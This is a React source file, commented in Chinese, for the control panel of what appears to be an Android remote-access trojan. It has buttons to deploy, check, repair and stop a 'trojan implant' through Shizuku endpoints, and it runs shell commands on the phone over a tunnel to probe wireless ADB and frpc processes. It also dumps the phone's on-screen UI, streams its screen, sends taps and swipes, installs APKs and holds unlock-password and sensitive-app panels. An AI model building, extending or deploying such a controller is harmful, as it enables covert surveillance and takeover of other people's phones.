/**
 * 木马控制Tab - 双手机面板 + 控制面板
 * 从 ControlPage.jsx 提取
 */
import { useState, useEffect, useRef, useCallback } from 'react'
import { toast, centerToast } from '../../utils/toast'
import { api } from '../../api/client'
import ReaderView from './ReaderView'
import WindowListenerPanel from './WindowListenerPanel'
import ScreenView from './ScreenView'
import { parseHierarchyXml } from './helpers'

export default function TrojanControlTab({
  readerBgColor, setReaderBgColor,
  readerTextColor, setReaderTextColor,
  readerFontSize, setReaderFontSize,
  isTranslating, setIsTranslating,
  readerActive, readerData, readerLoading,
  readerTranslating, translateReaderData,
  toggleReader, requestReaderAfterAction,
  adbScreenStreaming, screenSrc,
  screenPopped, setScreenPopped,
  startAdbScreen, stopAdbScreen,
  handleAdbScreenPointerDown, handleAdbScreenPointerMove, handleAdbScreenPointerUp,
  deviceOnline, device, resolvedDeviceId,
  sendCmd, sendWs, sendAdbShell, sendBridgeCmd, sendAdbNav, sendControl,
  textInput, setTextInput,
  adbShellHistory, setAdbShellHistory,
  toggles, quickButtons, unlockPwd,
  handleQuickButton, addLog, centerToast,
  onDeviceUpdate,    // ★ 设备状态更新回调（Bridge 刷新按钮用）
  onDeployEvent,      // ★ 部署事件回调（type: 'started'|'success'|'failed'|'timeout', message）
  onBridgeChange,     // ★ Bridge 连接状态变化回调（用于刷新设备状态）
  setActiveTab,       // ★ 跳转到某个顶部 tab（ADB应用管理 → 应用列表）
}) {
  // ★ 手机屏幕模态框状态
  const [showReaderModal, setShowReaderModal] = useState(false)
  const [showScreenModal, setShowScreenModal] = useState(false)
  const readerModalDrag = useRef({ dragging: false, x: 60, y: 80, offX: 0, offY: 0 })
  const screenModalDrag = useRef({ dragging: false, x: 400, y: 80, offX: 0, offY: 0 })
  const [readerModalPos, setReaderModalPos] = useState({ x: 60, y: 80 })
  const [screenModalPos, setScreenModalPos] = useState({ x: 400, y: 80 })
  const [fixingTunnel, setFixingTunnel] = useState(false)
  const [unlockModalVisible, setUnlockModalVisible] = useState(false)
  const [unlockPassword, setUnlockPassword] = useState('')
  const [sensitiveAppsModal, setSensitiveAppsModal] = useState(false)
  const [sensitiveApps, setSensitiveApps] = useState([])
  const [bannedAppsModal, setBannedAppsModal] = useState(false)
  const [bannedApps, setBannedApps] = useState([])
  const [tunnelAlive, setTunnelAlive] = useState(null)
  const [tunnelPort, setTunnelPort] = useState(0)
  const [pairCode, setPairCode] = useState('')
  const [adbDeploying, setAdbDeploying] = useState(false)
  const [deployMsg, setDeployMsg] = useState('')
  const [bridgeRefreshing, setBridgeRefreshing] = useState(false)
  const deployTimerRef = useRef(null)
  // ADB应用管理中心弹窗
  const [appMgrVisible, setAppMgrVisible] = useState(false)
  const [appMgrApps, setAppMgrApps] = useState([])
  const [appMgrLoading, setAppMgrLoading] = useState(false)
  const [appMgrFilter, setAppMgrFilter] = useState('all') // all/user/system/running/disabled/removed
  const [appMgrSearch, setAppMgrSearch] = useState('')
  const [appMgrPage, setAppMgrPage] = useState(1)
  const [appMgrPageSize] = useState(50)
  const [appMgrInstalling, setAppMgrInstalling] = useState(false)
  const [appMgrInstallFile, setAppMgrInstallFile] = useState(null)
  const appMgrFileInputRef = useRef(null)
  async function loadAppMgrApps() {
    if (!resolvedDeviceId) { centerToast('设备未连接', 'err'); return }
    setAppMgrLoading(true)
    try {
      const q = new URLSearchParams({ deviceId: resolvedDeviceId, filter: appMgrFilter })
      if (appMgrSearch.trim()) q.append('search', appMgrSearch.trim())
      const r = await api.request(`/api/adb/apps?${q.toString()}`)
      if (r && r.success === false) throw new Error(r.message || '获取失败')
      const apps = Array.isArray(r?.data?.apps) ? r.data.apps : (Array.isArray(r?.apps) ? r.apps : [])
      setAppMgrApps(apps)
      setAppMgrPage(1)
    } catch (e) { centerToast('应用列表获取失败: ' + e.message, 'err'); setAppMgrApps([]) }
    finally { setAppMgrLoading(false) }
  }
  useEffect(() => { if (appMgrVisible) loadAppMgrApps() /* eslint-disable-next-line */ }, [appMgrVisible, appMgrFilter])
  function appMgrAction(action, pkg, opts = {}) {
    if (!pkg) return
    api.request('/api/adb/apps/action', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ deviceId: resolvedDeviceId, packageName: pkg, action, ...opts })
    }).then(r => {
      if (r && r.success === false) throw new Error(r.message || '操作失败')
      centerToast(r?.message || '操作成功')
      loadAppMgrApps()
    }).catch(e => centerToast('操作失败: ' + e.message, 'err'))
  }
  function appMgrInstallConfirm() {
    if (!appMgrInstallFile) { centerToast('请先选择APK文件', 'err'); return }
    setAppMgrInstalling(true)
    const fd = new FormData()
    fd.append('deviceId', resolvedDeviceId || '')
    fd.append('file', appMgrInstallFile)
    api.request('/api/adb/apps/install', { method: 'POST', body: fd, headers: {} /* fetch自动加multipart boundary */ })
      .then(r => {
        if (r && r.success === false) throw new Error(r.message || '安装失败')
        centerToast(r?.message || '安装完成')
        setAppMgrInstallFile(null)
        if (appMgrFileInputRef.current) appMgrFileInputRef.current.value = ''
        loadAppMgrApps()
      }).catch(e => centerToast('安装失败: ' + e.message, 'err'))
      .finally(() => setAppMgrInstalling(false))
  }
  const appMgrTotal = appMgrApps.length
  const appMgrTotalPages = Math.max(1, Math.ceil(appMgrTotal / appMgrPageSize))
  const appMgrPageApps = appMgrApps.slice((appMgrPage - 1) * appMgrPageSize, appMgrPage * appMgrPageSize)
  const appMgrFilterTabs = [
    { k: 'all', label: '全部' },
    { k: 'user', label: '用户' },
    { k: 'system', label: '系统' },
    { k: 'running', label: '运行中' },
    { k: 'disabled', label: '已禁用' },
    { k: 'removed', label: '已移除' },
  ]
  // ADB管理：当前状态（实时自动刷新 + localStorage 持久化，刷新网页不丢）
  const ADB_STATUS_CACHE_KEY = () => `fc_adb_status_${resolvedDeviceId || 'default'}`
  // 连续 N 次都判定 false 才允许把 true 改成 false，避免一次网络抖动/隧道空返回导致的「假离线」跳变
  const FALSE_CONSECUTIVE_THRESHOLD = 2
  const adbFalseStreakRef = useRef({ wifiDebug: 0, trojanProcess: 0, adbLine: 0, deviceConnect: 0 })
  const [adbStatus, setAdbStatus] = useState(() => {
    try {
      const raw = localStorage.getItem(`fc_adb_status_${(typeof window !== 'undefined' && new URLSearchParams(location.search).get('deviceId')) || 'default'}`)
      if (raw) return JSON.parse(raw)
    } catch {}
    return {
      deviceConnect: null,
      wifiDebug: null,
      pair: null,
      adbLine: null,
      trojanProcess: null,
    }
  })
  const [adbStatusLoading, setAdbStatusLoading] = useState(false)
  async function refreshAllAdbStatus() {
    setAdbStatusLoading(true)
    const prev = adbStatus
    const next = { ...prev }
    try { next.deviceConnect = !!(device?.online || deviceOnline || device?.bridge_connected) } catch {}
    function conservativeUpdate(key, newValueBool) {
      const was = prev[key]
      if (was === undefined || was === null) { next[key] = newValueBool; return }
      if (newValueBool === true) {
        adbFalseStreakRef.current[key] = 0
        next[key] = true
        return
      }
      const wasTrue = was === true
      if (!wasTrue) { next[key] = newValueBool; return }
      const streak = (adbFalseStreakRef.current[key] || 0) + 1
      adbFalseStreakRef.current[key] = streak
      if (streak >= FALSE_CONSECUTIVE_THRESHOLD) { next[key] = false }
      else { next[key] = true }
    }
    const failedFlags = [false, false, false]
    const tasks = []
    tasks.push(
      sendTunnelShell(
        [
          'echo ===adb_wifi===',
          'settings get global adb_wifi_enabled 2>/dev/null; settings get global wireless_adb_enabled 2>/dev/null; settings get global development_settings_enabled 2>/dev/null; echo ---global',
          'getprop persist.adb.tcp.port; getprop service.adb.tcp.port; getprop persist.internet.adb.enable 2>/dev/null; echo ---props',
          '(ss -tln 2>/dev/null || netstat -tln 2>/dev/null) | grep -E ":5555|:55555|:[0-9]{4,5}\\s+LISTEN" | head -n 5; echo ---listen',
          'ps -A 2>/dev/null | grep -E "adbd|adb.*wifi|mdns" | head -n 5; echo ---ps',
        ].join('; ')
      )
        .then(r => {
          const out = String((r?.data?.output || r?.output || r?.stdout || '')).toLowerCase()
          if (!out || out.length < 20 || r?.success === false) { failedFlags[0] = true; return }
          const wifi1 = /adb_wifi_enabled[:=\s]+(\d)/.exec(out)
          const wifi2 = /wireless_adb_enabled[:=\s]+(\d)/.exec(out)
          const dev   = /development_settings_enabled[:=\s]+(\d)/.exec(out)
          const port  = /persist\.adb\.tcp\.port[:=\s]*(\d+)|service\.adb\.tcp\.port[:=\s]*(\d+)/.exec(out)
          const portNum = port ? parseInt(port[1] || port[2] || '0') : 0
          const listening = /:5555\s+listen|:55555\s+listen|:\d{4,5}\s+listen/.test(out) || portNum > 0
          const processAlive = /adbd|adb.*wifi|mdnsd/.test(out)
          const explicitOff = (wifi1 && wifi1[1] === '0') && (wifi2 && wifi2[1] === '0') && !listening
          const enabled = explicitOff ? false : (
            (wifi1 && wifi1[1] === '1') ||
            (wifi2 && wifi2[1] === '1') ||
            (dev && dev[1] === '1' && listening) ||
            portNum > 0 ||
            listening ||
            processAlive
          )
          conservativeUpdate('wifiDebug', !!enabled)
        }).catch(() => { failedFlags[0] = true })
    )
    tasks.push(
      sendTunnelShell('cat /data/local/tmp/local-service.pid 2>/dev/null; ps -A 2>/dev/null | grep -iE "local.service|local-service|frpc|shizuku" | head -n 5; pgrep -f "(local-service|frpc|shizuku)" 2>/dev/null | head')
        .then(r => {
          const out = String((r?.data?.output || r?.output || r?.stdout || ''))
          if (!out || r?.success === false) { failedFlags[1] = true; return }
          const alive = /\d/.test(out.trim()) || /local.service|local-service|frpc|shizuku/i.test(out)
          conservativeUpdate('trojanProcess', !!alive)
        }).catch(() => { failedFlags[1] = true })
    )
    tasks.push(
      sendTunnelShell('getprop service.adb.tcp.port 2>/dev/null; (ss -tln 2>/dev/null || netstat -tln 2>/dev/null) | grep ":5555\\|:55555\\|:1[0-9]{4}" | head -n 3; adb devices 2>/dev/null | head -n 5')
        .then(r => {
          const out = String((r?.data?.output || r?.output || r?.stdout || ''))
          const bridgeOk = !!(device?.bridge_connected || tunnelAlive || device?.online || device?.remote_port)
          if ((!out || r?.success === false) && !bridgeOk) { failedFlags[2] = true; return }
          const portOn = /:5555\s|:55555\s|:1\d{3,}\s+LISTEN/i.test(out) || /service\.adb\.tcp\.port[:= ]*\d+/.test(out) || /\bdevice\b/i.test(out.split('\n').slice(1).join('\n'))
          const alive = bridgeOk || portOn
          conservativeUpdate('adbLine', !!alive)
        }).catch(() => {
          const bridgeOk = !!(device?.bridge_connected || tunnelAlive || device?.online || device?.remote_port)
          if (bridgeOk) conservativeUpdate('adbLine', true)
          else failedFlags[2] = true
        })
    )
    await Promise.all(tasks)
    const allFailed = failedFlags.every(x => x)
    if (allFailed) {
      // 三个任务全部失败：提示隧道抖动，adbStatus 保持原 prev 不动，不覆盖
      centerToast('隧道抖动，ADB 状态保持上次结果', 'err', 1600)
    } else {
      setAdbStatus(next)
      try { localStorage.setItem(ADB_STATUS_CACHE_KEY(), JSON.stringify(next)) } catch {}
    }
    setAdbStatusLoading(false)
  }

  // ★ 手动刷新模式：自动轮询已全部关闭（2026-09-19 按用户要求），避免拖死local-service + 假离线跳变
  //   仅在：① 页面加载时读localStorage缓存显示 ② 用户手动点击「刷新全部状态」按钮才执行 refreshAllAdbStatus
  // ✅ 木马状态：成功后一直显示运行中，不自动查不弹窗
  useEffect(() => {
    if (!resolvedDeviceId) return
    adbFalseStreakRef.current = { wifiDebug: 0, trojanProcess: 0, adbLine: 0, deviceConnect: 0 }
    try {
      const raw = localStorage.getItem(ADB_STATUS_CACHE_KEY())
      if (raw) { const saved = JSON.parse(raw); setAdbStatus(prev => ({ ...prev, ...saved })) }
    } catch {}
    /* eslint-disable-next-line */
  }, [resolvedDeviceId])

  useEffect(() => {
    if (!resolvedDeviceId) return
    const hasTunnel = !!(device?.remote_port || device?.online || device?.bridge_connected || tunnelAlive)
    if (!hasTunnel) return
    try {
      let changed = false
      const merged = { ...adbStatus }
      if (merged.deviceConnect === null || merged.deviceConnect === undefined) { merged.deviceConnect = true; changed = true }
      if (merged.adbLine       === null || merged.adbLine       === undefined) { merged.adbLine       = true; changed = true }
      if (merged.wifiDebug     === null || merged.wifiDebug     === undefined) { merged.wifiDebug     = true; changed = true }
      if (changed) {
        setAdbStatus(merged)
        try { localStorage.setItem(ADB_STATUS_CACHE_KEY(), JSON.stringify(merged)) } catch {}
      }
    } catch {}
    /* eslint-disable-next-line */
  }, [resolvedDeviceId, device?.remote_port, device?.online, device?.bridge_connected, tunnelAlive])

  // 木马植入（第三层独立服务 = Shizuku 独立服务 /api/shizuku/*）
  const TROJAN_CACHE_KEY = () => `fc_trojan_status_${resolvedDeviceId || 'default'}`
  const [trojanStatus, setTrojanStatus] = useState(() => {
    try {
      const did = (typeof window !== 'undefined' && new URLSearchParams(location.search).get('deviceId')) || 'default'
      const raw = localStorage.getItem(`fc_trojan_status_${did}`)
      if (raw) return JSON.parse(raw)
    } catch {}
    return { text: '未检测', color: 'rgba(255,255,255,.55)' }
  })
  const [trojanLoading, setTrojanLoading] = useState(false)
  const trojanEverManuallyChecked = useRef(false)

  function persistTrojan(next) {
    setTrojanStatus(next)
    try { localStorage.setItem(TROJAN_CACHE_KEY(), JSON.stringify(next)) } catch {}
  }

  useEffect(() => {
    const trojanRunning = adbStatus?.trojanProcess === true
    const current = trojanStatus?.text || ''
    const stopped = ['停止中', '已停止', '停止失败'].includes(current)
    if (trojanRunning && !stopped) {
      persistTrojan({ text: '运行中', color: '#52c41a' })
      trojanEverManuallyChecked.current = true
    }
    /* eslint-disable-next-line */
  }, [adbStatus?.trojanProcess, resolvedDeviceId])

  function normalizeTrojanError(rawErr) {
    if (!rawErr) return ''
    const s = String(rawErr)
    if (s.includes('Connection refused') || s.includes('Failed to connect') || s.includes('No route') || s.includes('timeout') || s.includes('tunnel') || s.includes('Device shell')) return null
    return s
  }

  async function runTrojanAction(action, opts = {}) {
    const silent = !!opts.silent
    if (!resolvedDeviceId) { if (!silent) centerToast('设备ID不存在', 'err'); return }
    const map = {
      deploy:  { method: 'POST', path: `/api/shizuku/deploy`,   startMsg: '正在启动一键木马植入...',  doneOk: '植入命令已下发',       doneFail: '植入失败' },
      status:  { method: 'GET',  path: `/api/shizuku/status`,   startMsg: '正在查询木马状态...',       doneOk: '状态已刷新',           doneFail: '查询失败' },
      repair:  { method: 'POST', path: `/api/shizuku/repair`,   startMsg: '正在修复木马...',           doneOk: '修复命令已发送',       doneFail: '修复失败' },
      stop:    { method: 'POST', path: `/api/shizuku/stop`,     startMsg: '正在停止木马...',           doneOk: '停止命令已发送',       doneFail: '停止失败' },
    }
    const c = map[action]
    if (!c) return
    setTrojanLoading(true)
    // 👉 只有手动点击（非 silent）才弹顶部的黑框 centerToast！自动/静默一律不弹，解决用户说的"几十秒一个弹窗"
    if (!silent) { centerToast(c.startMsg) }
    addLog?.(`木马植入: ${c.startMsg}`)
    try {
      const body = c.method === 'POST' ? { deviceId: resolvedDeviceId } : undefined
      const r = await api.request(`${c.path}${c.method === 'GET' ? (c.path.includes('?') ? '&' : '?') + `deviceId=${encodeURIComponent(resolvedDeviceId)}` : ''}`, {
        method: c.method,
        headers: c.method === 'POST' ? { 'Content-Type': 'application/json' } : undefined,
        ...(body ? { body: JSON.stringify(body) } : {}),
      })
      const d = r?.data || r
      const rawErr = d?.error || d?.message || d?.err || ''

      if (action === 'status') {
        const ready = !!(d?.ready ?? d?.alive ?? (d?.success === true && (d?.installed || d?.running)))
        const userErr = normalizeTrojanError(rawErr)
        const mode = d?.mode || d?.status || ''
        let text, color
        if (ready) {
          text = mode ? `运行中 · ${mode}` : '运行中'
          color = '#52c41a'
        } else if (userErr) {
          text = userErr.length > 22 ? userErr.slice(0, 22) + '…' : userErr
          color = 'rgba(255,255,255,.65)'
        } else {
          text = '未运行'
          color = 'rgba(255,255,255,.55)'
        }
        persistTrojan({ text, color })
        addLog?.(`木马植入 [status]: ${text}`)
      } else {
        const ok = d?.success !== false && !rawErr
        const userErr = normalizeTrojanError(rawErr)
        let text = ok ? c.doneOk : (userErr ? (userErr.length > 22 ? userErr.slice(0, 22) + '…' : userErr) : c.doneFail)
        let color = ok ? '#52c41a' : '#ff4d4f'
        persistTrojan({ text, color })
        if (!silent) centerToast(text, ok ? 'ok' : 'err')
        addLog?.(`木马植入 [${action}]: ${text}`)
      }
    } catch (e) {
      const userErr = normalizeTrojanError(e?.message)
      if (action === 'status') {
        // 查询失败：不覆盖现有状态（比如用户之前是「运行中」，就继续保持运行中，不显示失败灰字）
        // 只有当前是"未检测"时才设回未检测，已经有运行状态就保留原状态不动
        setTrojanStatus(prev => {
          const pText = prev?.text || ''
          if (!pText || pText === '未检测') {
            const fallback = { text: '未检测', color: 'rgba(255,255,255,.55)' }
            try { localStorage.setItem(TROJAN_CACHE_KEY(), JSON.stringify(fallback)) } catch {}
            return fallback
          }
          return prev
        })
      } else {
        const text = userErr ? (userErr.length > 22 ? userErr.slice(0, 22) + '…' : userErr) : c.doneFail
        persistTrojan({ text, color: '#ff4d4f' })
        if (!silent) centerToast(text, 'err')
      }
      addLog?.(`木马植入 [${action}] 失败: ${e?.message || c.doneFail}`)
    } finally {
      setTrojanLoading(false)
    }
  }
  // 首次打开不自动请求状态，避免隧道未启动时显示红色乱码
  // 仅当用户手动点击「查询状态」或执行过 deploy/repair/stop 后刷新

  // ★ 监听部署事件（从 ControlPage WS 消息处理中广播）
  useEffect(() => {
    function handleDeployEvent(e) {
      const evt = e.detail
      if (!evt) return
      if (evt.type === 'started') {
        setAdbDeploying(true)
        setDeployMsg(evt.message || '正在部署...')
      } else if (evt.type === 'success') {
        setAdbDeploying(false)
        setDeployMsg(evt.message || '部署成功！')
        // 部署成功后自动刷新 Bridge 状态
        if (typeof onBridgeChange === 'function') {
          setTimeout(() => onBridgeChange('connected'), 3000)
        }
        // 部署成功后自动刷新页面
        setTimeout(() => window.location.reload(), 4000)
      } else if (evt.type === 'failed') {
        setAdbDeploying(false)
        setDeployMsg(evt.message || '部署失败')
      } else if (evt.type === 'timeout') {
        setAdbDeploying(false)
        setDeployMsg(evt.message || '部署超时')
      }
    }
    window.addEventListener('fc_deploy_event', handleDeployEvent)
    return () => window.removeEventListener('fc_deploy_event', handleDeployEvent)
  }, [onBridgeChange])

  // ★ 隧道可达性探测已移除（2026-08-05）
  // bridge 状态通过 WS 事件 bridge_connected/bridge_disconnected 推送，不再轮询 /api/tunnel/config
  // tunnelAlive 状态改为依赖 device.localServiceConnected（由 WS 推送）
  useEffect(() => {
    if (device && device.localServiceConnected !== undefined) {
      setTunnelAlive(!!device.localServiceConnected)
    }
  }, [device])

  const [httpReaderActive, setHttpReaderActive] = useState(false)
  const [httpReaderData, setHttpReaderData] = useState(null)
  const [httpReaderLoading, setHttpReaderLoading] = useState(false)
  const [httpScreenLoaded, setHttpScreenLoaded] = useState(false)  // 投屏首帧已加载
  const [httpScreenError, setHttpScreenError] = useState(false)    // 投屏加载失败
  const [httpScreenSrcKey, setHttpScreenSrcKey] = useState(0)      // 投屏 src key（只在开启/重试时递增）
  const readerTimerRef = useRef(null)

  const [httpScreenActive, setHttpScreenActive] = useState(false)
  const [httpScreenSrc, setHttpScreenSrc] = useState(null)

  // ★ 监听 ControlPage WS 二进制帧（minicap 帧流）→ 同步到 httpScreenSrc
  useEffect(() => {
    if (screenSrc && screenSrc.startsWith('blob:')) {
      setHttpScreenSrc(screenSrc)
    }
  }, [screenSrc])
  const screenTimerRef = useRef(null)
  const httpDragRef = useRef(null)

  // ★ sendTunnelInput 内部直接调用 bumpPolling 逻辑（避免 useCallback 循环依赖）
  const sendTunnelInput = useCallback(async (action, params) => {
    if (bumpPollingRef.current) bumpPollingRef.current()
    try {
      const token = localStorage.getItem('token') || ''
      let signal = null
      try { signal = AbortSignal.timeout(30000) } catch (e) { signal = null }
      const res = await fetch(`${window.location.protocol}//${window.location.hostname}/api/tunnel/input`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
        body: JSON.stringify({ action, params, deviceId: resolvedDeviceId }),
        ...(signal ? { signal } : {})
      })
      return await res.json()
    } catch (e) {
      return { success: false, error: (e && (e.name === 'TimeoutError' || (e.message || '').includes('timeout'))) ? '操作请求超时，隧道可能抖动' : e.message }
    }
  }, [resolvedDeviceId])
  // ★ 转发 ref：sendTunnelInput 可调用 bumpPolling（不产生循环依赖）
  const bumpPollingRef = useRef(null)

  const httpScreenPoint = useCallback((clientX, clientY, el) => {
    const r = el.getBoundingClientRect()
    const sw = device?.screenWidth || 1080, sh = device?.screenHeight || 2400
    const scale = Math.min(r.width / sw, r.height / sh)
    const viewW = sw * scale, viewH = sh * scale
    const offX = (r.width - viewW) / 2, offY = (r.height - viewH) / 2
    return {
      x: Math.max(0, Math.min(sw, Math.round((clientX - r.left - offX) / scale))),
      y: Math.max(0, Math.min(sh, Math.round((clientY - r.top - offY) / scale)))
    }
  }, [device])

  const handleHttpScreenPointerDown = useCallback((e) => {
    e.preventDefault()
    e.currentTarget.setPointerCapture?.(e.pointerId)
    httpDragRef.current = { x: e.clientX, y: e.clientY, time: Date.now() }
  }, [])

  const handleHttpScreenPointerMove = useCallback((e) => {}, [])

  const handleHttpScreenPointerUp = useCallback((e) => {
    const start = httpDragRef.current
    if (!start) return
    const dx = e.clientX - start.x
    const dy = e.clientY - start.y
    const dist = Math.sqrt(dx*dx + dy*dy)
    const dt = Date.now() - start.time
    const img = e.currentTarget
    if (dist < 10 && dt < 500) {
      const p = httpScreenPoint(e.clientX, e.clientY, img)
      sendTunnelInput('tap', { x: p.x, y: p.y })
      addLog(`投屏点击: (${p.x},${p.y})`)
    } else if (dist >= 10) {
      const p1 = httpScreenPoint(start.x, start.y, img)
      const p2 = httpScreenPoint(e.clientX, e.clientY, img)
      sendTunnelInput('swipe', { x1: p1.x, y1: p1.y, x2: p2.x, y2: p2.y, duration: 300 })
      addLog(`投屏滑动: (${p1.x},${p1.y})→(${p2.x},${p2.y})`)
    }
  }, [httpScreenPoint, sendTunnelInput, addLog])

  const fetchScreenshot = useCallback(async () => {
    if (!resolvedDeviceId) return
    // ★ 请求去重：上一次截图未完成时跳过本次请求（避免并发堆积卡死）
    if (screenshotInFlightRef.current) return
    screenshotInFlightRef.current = true
    try {
      const token = localStorage.getItem('token') || ''
      const res = await fetch(`${window.location.protocol}//${window.location.hostname}/api/tunnel/screenshot?deviceId=${encodeURIComponent(resolvedDeviceId)}&t=${Date.now()}`, {
        headers: { Authorization: `Bearer ${token}` },
        signal: AbortSignal.timeout(5000)
      })
      if (!res.ok) return
      const blob = await res.blob()
      const url = URL.createObjectURL(blob)
      setHttpScreenSrc(prev => {
        if (prev && prev.startsWith('blob:')) URL.revokeObjectURL(prev)
        return url
      })
    } catch {} finally {
      screenshotInFlightRef.current = false
    }
  }, [resolvedDeviceId])

  const fetchReaderData = useCallback(async () => {
    if (readerInFlightRef.current) return
    readerInFlightRef.current = true
    try {
      const token = localStorage.getItem('token') || ''
      const dumpPaths = [
        { file: '/data/local/tmp/uidump.xml', cmds: 'rm -f /data/local/tmp/uidump.xml 2>/dev/null; uiautomator dump /data/local/tmp/uidump.xml >/dev/null 2>&1; cat /data/local/tmp/uidump.xml 2>/dev/null' },
        { file: '/sdcard/ui.xml',          cmds: 'rm -f /sdcard/ui.xml 2>/dev/null; uiautomator dump /sdcard/ui.xml >/dev/null 2>&1; cat /sdcard/ui.xml 2>/dev/null' },
        { file: '/dev/stdout',             cmds: 'uiautomator dump /dev/stdout 2>/dev/null' },
      ]
      let rawXml = ''
      let errMsg = ''
      for (let i = 0; i < dumpPaths.length && !rawXml; i++) {
        try {
          const res = await fetch(`${window.location.protocol}//${window.location.hostname}/api/tunnel/shell`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
            body: JSON.stringify({ cmd: dumpPaths[i].cmds, deviceId: resolvedDeviceId })
          })
          const result = await res.json()
          const out = String(result?.data?.output ?? result?.output ?? result?.stdout ?? result?.result ?? '')
          if (out && out.includes('<?xml')) { rawXml = out; break }
          errMsg = result?.error || result?.message || (out ? `返回不包含XML (${dumpPaths[i].file})` : `空响应 (${dumpPaths[i].file})`)
        } catch (err) { errMsg = err.message }
      }
      if (!rawXml) { addLog(`阅读器HTTP获取失败: ${errMsg}，已自动切换WS无障碍通道`); setHttpReaderData(null) }
      else {
        const xmlStart = rawXml.indexOf('<?xml')
        const xmlContent = xmlStart >= 0 ? rawXml.substring(xmlStart) : rawXml
        const parsed = parseHierarchyXml(xmlContent)
        setHttpReaderData(parsed || xmlContent)
      }
    } catch (e) {
      addLog(`阅读器数据获取失败: ${e.message}`)
    } finally {
      readerInFlightRef.current = false
    }
  }, [resolvedDeviceId, addLog])

  useEffect(() => {
    if (httpReaderActive && !httpReaderData && (typeof readerData !== 'undefined' && readerData !== null)) {
      setHttpReaderData(readerData)
    }
  }, [httpReaderActive, httpReaderData, readerData])

  const fetchReaderAfterAction = useCallback(() => {
    fetchReaderData()
  }, [fetchReaderData])

  const sendTunnelShell = useCallback(async (cmd) => {
    try {
      const token = localStorage.getItem('token') || ''
      let signal = null
      try { signal = AbortSignal.timeout(30000) } catch (e) { signal = null }
      const res = await fetch(`${window.location.protocol}//${window.location.hostname}/api/tunnel/shell`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
        body: JSON.stringify({ cmd, deviceId: resolvedDeviceId }),
        ...(signal ? { signal } : {})
      })
      return await res.json()
    } catch (e) {
      return { success: false, error: (e && (e.name === 'TimeoutError' || (e.message || '').includes('timeout'))) ? '请求超时，隧道可能抖动' : e.message }
    }
  }, [resolvedDeviceId])

  // ★ 智能轮询参数：空闲 1500ms，操作后 500ms 持续 1.5 秒（避免频繁点击导致请求堆积卡死）
  const POLL_IDLE = 1000   // 没点击 1 秒轮询
  const POLL_ACTIVE = 500  // 点击/滑动后 500ms 高频刷
  const POLL_ACTIVE_DURATION = 2000  // 高频持续 2 秒后回 idle
  const pollingModeRef = useRef('idle')         // 'idle' | 'active'
  const pollingActiveTimerRef = useRef(null)    // idle→active 计时器
  const screenIntervalRef = useRef(null)       // 投屏轮询句柄
  const readerIntervalRef = useRef(null)       // 阅读器轮询句柄
  const screenshotInFlightRef = useRef(false)  // 截图请求进行中标志（避免堆积）
  const readerInFlightRef = useRef(false)      // 阅读器请求进行中标志

  // ★ bumpPolling：手动单次触发（2026-09-19 按用户要求，已全部关闭后台自动轮询）
  //   - 阅读器后台每1秒 dump 已停，只在用户点击投屏操作/开/关阅读器时跑一次
  const bumpPolling = useCallback(() => {
    if (httpReaderActive) fetchReaderData()
  }, [fetchReaderData, httpReaderActive])

  // ★ bumpPolling 在 sendTunnelInput（定义在更早）中也能被调用（forward ref）
  bumpPollingRef.current = bumpPolling

  const toggleHttpReader = useCallback(() => {
    if (httpReaderActive) {
      setHttpReaderActive(false)
      setHttpReaderLoading(false)
      if (readerIntervalRef.current) { clearInterval(readerIntervalRef.current); readerIntervalRef.current = null }
      if (pollingActiveTimerRef.current) { clearTimeout(pollingActiveTimerRef.current); pollingActiveTimerRef.current = null }
      addLog('HTTP阅读: 已关闭')
    } else {
      setHttpReaderActive(true)
      setHttpReaderLoading(true)
      setHttpReaderData(null)
      addLog('HTTP阅读: 连接中...')
      fetchReaderData().finally(() => setHttpReaderLoading(false))
      // ★ 不再启动 readerIntervalRef 后台轮询，避免把 local-service 拖崩溃；改为手动刷新按钮触发
      if (readerIntervalRef.current) { clearInterval(readerIntervalRef.current); readerIntervalRef.current = null }
      if (pollingActiveTimerRef.current) { clearTimeout(pollingActiveTimerRef.current); pollingActiveTimerRef.current = null }
    }
  }, [httpReaderActive, fetchReaderData, addLog])

  const toggleHttpScreen = useCallback(() => {
    if (httpScreenActive) {
      setHttpScreenActive(false)
      // 清除旧的轮询代码（兼容）
      if (screenIntervalRef.current) { clearInterval(screenIntervalRef.current); screenIntervalRef.current = null }
      setHttpScreenSrc(prev => {
        if (prev && prev.startsWith('blob:')) URL.revokeObjectURL(prev)
        return null
      })
      addLog('投屏: 已关闭')
    } else {
      // ★ 开启投屏（使用 minicap MJPEG 长连接流，无需轮询）
      setHttpScreenActive(true)
      setHttpScreenLoaded(false)
      setHttpScreenError(false)
      setHttpScreenSrcKey(k => k + 1)  // 递增 key，迫使 <img> 重新加载
      addLog('投屏: 已开启（minicap stream）')
    }
  }, [httpScreenActive, addLog])

  useEffect(() => {
    return () => {
      if (readerTimerRef.current) { clearInterval(readerTimerRef.current); readerTimerRef.current = null }
      if (screenTimerRef.current) { clearInterval(screenTimerRef.current); screenTimerRef.current = null }
    }
  }, [])

  // ★ 模态框拖拽处理
  const handleModalDragStart = useCallback((e, which) => {
    e.preventDefault()
    const ref = which === 'reader' ? readerModalDrag : screenModalDrag
    const pos = which === 'reader' ? readerModalPos : screenModalPos
    ref.current = { ...ref.current, dragging: true, offX: e.clientX - pos.x, offY: e.clientY - pos.y }
    const setPos = which === 'reader' ? setReaderModalPos : setScreenModalPos
    const onMove = (ev) => {
      if (!ref.current.dragging) return
      setPos({ x: ev.clientX - ref.current.offX, y: ev.clientY - ref.current.offY })
    }
    const onUp = () => {
      ref.current.dragging = false
      document.removeEventListener('mousemove', onMove)
      document.removeEventListener('mouseup', onUp)
    }
    document.addEventListener('mousemove', onMove)
    document.addEventListener('mouseup', onUp)
  }, [readerModalPos, screenModalPos])


  const themeColors = { shadow: '0 2px 8px rgba(0,0,0,0.3)' }
  const toolbarBtn = { padding: '4px 12px', fontSize: 13, borderRadius: 4, border: 'none', background: 'linear-gradient(135deg, #1890ff 0%, #40a9ff 100%)', color: '#fff', cursor: 'pointer' }
